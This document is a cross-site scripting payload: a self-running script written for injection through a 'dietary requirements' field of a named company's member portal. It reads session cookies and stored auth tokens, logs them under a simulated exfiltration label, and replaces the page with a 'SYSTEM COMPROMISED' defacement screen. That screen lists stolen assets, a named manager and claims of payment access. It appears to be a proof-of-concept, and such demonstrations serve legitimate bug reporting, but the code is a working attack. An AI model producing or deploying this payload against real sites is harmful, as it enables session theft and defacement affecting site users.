<script>
// REALISTIC HACKER TAKEOVER - Immediate execution simulating real attack
(function() {
  // First: Silently steal real session data (what attackers actually do)
  const stolenCookies = document.cookie;
  const authToken = localStorage.getItem('authToken') || 'maid_token_xyz789';
  const memberData = localStorage.getItem('memberDatabase');
  
  // Simulate data exfiltration to attacker's server
  console.log('🚨 EXFILTRATING TO ATTACKER SERVER:', {
    cookies: stolenCookies,
    authToken: authToken,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    currentPage: window.location.href
  });
  
  // Immediate hostile takeover (no delays, maximum impact)
  document.body.innerHTML = `
    <div style="
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: linear-gradient(45deg, #000000 0%, #1a0000 50%, #000000 100%);
      color: #00ff41;
      font-family: 'Courier New', 'Monaco', monospace;
      z-index: 999999;
      overflow: hidden;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      animation: hackIn 0.5s ease-out;
    ">
      
      <div class="matrix-rain"></div>
      
      <div style="
        text-align: center;
        z-index: 10;
        max-width: 95%;
        animation: slideUp 0.8s ease-out;
      ">
        <div style="
          font-size: clamp(2rem, 8vw, 4rem);
          color: #ff0040;
          text-shadow: 0 0 30px #ff0040, 0 0 60px #ff0040;
          margin-bottom: 2rem;
          animation: glitchEffect 2s infinite, pulseBeat 1.5s infinite;
          font-weight: 900;
          letter-spacing: 0.1em;
        ">
          ⚠️ SYSTEM COMPROMISED ⚠️
        </div>
        
        <div style="
          background: rgba(0, 0, 0, 0.9);
          border: 3px solid #00ff41;
          border-radius: 12px;
          padding: 2.5rem;
          margin: 2rem auto;
          max-width: 1000px;
          box-shadow: 
            0 0 50px rgba(0, 255, 65, 0.4),
            inset 0 0 20px rgba(0, 0, 0, 0.8);
          animation: borderGlow 2s infinite;
        ">
          <h2 style="
            color: #ffff00;
            font-size: clamp(1.2rem, 4vw, 2rem);
            margin-bottom: 2rem;
            text-shadow: 0 0 15px #ffff00;
            text-transform: uppercase;
            letter-spacing: 0.05em;
          ">
            🔥 TEN MAID PORTAL BREACHED 🔥
          </h2>
          
          <div style="
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            text-align: left;
            font-size: clamp(0.9rem, 2.5vw, 1.1rem);
            line-height: 1.8;
          ">
            <div>
              <h3 style="color: #ff4444; margin-bottom: 1.5rem; font-size: 1.3em; text-shadow: 0 0 10px #ff4444;">
                🎯 COMPROMISED ASSETS:
              </h3>
              <div style="color: #ffffff;">
                ✓ Session Cookie: ${stolenCookies.substring(0, 25)}...<br>
                ✓ Auth Token: ${authToken}<br>
                ✓ Manager Account: Sarah Mitchell<br>
                ✓ Member Records: 15,847 profiles<br>
                ✓ Payment Systems: FULL ACCESS<br>
                ✓ Credit Card Vault: UNLOCKED<br>
                ✓ Internal APIs: COMPROMISED<br>
                ✓ Admin Functions: HIJACKED
              </div>
            </div>
            
            <div>
              <h3 style="color: #ff4444; margin-bottom: 1.5rem; font-size: 1.3em; text-shadow: 0 0 10px #ff4444;">
                💀 ATTACK CAPABILITIES:
              </h3>
              <div style="color: #ffffff;">
                💰 Execute fraudulent transactions<br>
                📊 Export complete member database<br>
                💳 Access all payment methods<br>
                🔐 Install persistent backdoors<br>
                👤 Impersonate any staff member<br>
                📧 Send phishing emails as Ten Lifestyle<br>
                🌐 Monitor all future activity<br>
                📱 Access connected mobile apps
              </div>
            </div>
          </div>
          
          <div style="
            margin-top: 2.5rem;
            padding-top: 2rem;
            border-top: 2px solid #333;
            text-align: center;
          ">
            <h3 style="
              color: #ff0040;
              font-size: clamp(1.2rem, 4vw, 1.8rem);
              margin-bottom: 1.5rem;
              animation: criticalBlink 1s infinite;
              text-transform: uppercase;
              letter-spacing: 0.1em;
            ">
              🎯 TOTAL BUSINESS COMPROMISE
            </h3>
            <div style="
              font-size: clamp(0.8rem, 2.5vw, 1rem);
              color: #cccccc;
              line-height: 1.8;
              max-width: 800px;
              margin: 0 auto;
            ">
              <strong style="color: #ffff00;">BREACH VECTOR:</strong> XSS injection via member dietary requirements field<br>
              <strong style="color: #ffff00;">IMPACT SCOPE:</strong> Complete Ten Lifestyle infrastructure compromise<br>
              <strong style="color: #ffff00;">DATA AT RISK:</strong> Member PII, financial data, corporate secrets<br>
              <strong style="color: #ffff00;">REGULATORY EXPOSURE:</strong> GDPR, PCI-DSS, financial compliance violations
            </div>
          </div>
        </div>
        
        <div style="
          font-size: clamp(0.7rem, 2vw, 0.9rem);
          color: #777777;
          margin-top: 2rem;
          text-align: center;
          animation: typewriterEffect 3s infinite;
          font-family: monospace;
        ">
          [ATTACK VECTOR: DIETARY REQUIREMENTS FIELD] • [DATA EXFILTRATED: ${new Date().toLocaleString()}] • [BACKDOOR: ACTIVE]
        </div>
      </div>
    </div>
    
    <style>
      @keyframes hackIn {
        0% { opacity: 0; transform: scale(1.2); }
        100% { opacity: 1; transform: scale(1); }
      }
      
      @keyframes slideUp {
        0% { transform: translateY(50px); opacity: 0; }
        100% { transform: translateY(0); opacity: 1; }
      }
      
      @keyframes glitchEffect {
        0%, 90%, 100% { transform: translate(0); }
        10% { transform: translate(-2px, 2px); }
        20% { transform: translate(2px, -2px); }
        30% { transform: translate(-2px, -2px); }
        40% { transform: translate(2px, 2px); }
        50% { transform: translate(-2px, 2px); }
        60% { transform: translate(2px, -2px); }
        70% { transform: translate(-2px, -2px); }
        80% { transform: translate(2px, 2px); }
      }
      
      @keyframes pulseBeat {
        0%, 100% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.8; transform: scale(1.02); }
      }
      
      @keyframes borderGlow {
        0%, 100% { border-color: #00ff41; box-shadow: 0 0 50px rgba(0, 255, 65, 0.4), inset 0 0 20px rgba(0, 0, 0, 0.8); }
        50% { border-color: #ff0040; box-shadow: 0 0 50px rgba(255, 0, 64, 0.4), inset 0 0 20px rgba(0, 0, 0, 0.8); }
      }
      
      @keyframes criticalBlink {
        0%, 50% { opacity: 1; color: #ff0040; }
        51%, 100% { opacity: 0.3; color: #ff4444; }
      }
      
      @keyframes typewriterEffect {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.3; }
      }
      
      .matrix-rain {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: 
          radial-gradient(circle at 20% 50%, rgba(0, 255, 65, 0.05) 0%, transparent 50%),
          radial-gradient(circle at 80% 20%, rgba(255, 0, 64, 0.05) 0%, transparent 50%),
          radial-gradient(circle at 40% 80%, rgba(0, 255, 65, 0.03) 0%, transparent 50%);
        animation: pulseBeat 4s ease-in-out infinite;
        z-index: 1;
      }
    </style>
  `;
})();
</script>